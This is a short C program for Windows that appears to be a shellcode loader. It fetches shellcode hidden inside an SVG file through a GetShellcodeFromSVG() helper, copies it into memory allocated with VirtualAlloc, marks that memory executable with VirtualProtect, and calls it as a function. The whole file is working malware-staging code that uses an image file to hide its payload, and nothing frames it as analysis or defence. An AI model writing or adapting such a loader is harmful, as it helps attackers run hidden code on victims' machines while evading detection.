#include <stdio.h>
#include <windows.h>
#include "svg.h"

int main()
{

    struct svgdata* d = GetShellcodeFromSVG();

    unsigned char* buf = d->shellcode;
    int bufSz = d->size;

    if(bufSz == 0)
    {
        return 1;
    }

    DWORD lpflOldProtect = 0;

    LPVOID pAddress = VirtualAlloc(NULL, bufSz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    RtlMoveMemory(pAddress, buf, bufSz);
    VirtualProtect(pAddress, bufSz, PAGE_EXECUTE_READ, &lpflOldProtect);
    int (*go)() = (int(*)())pAddress;
    go();
    return 0;
}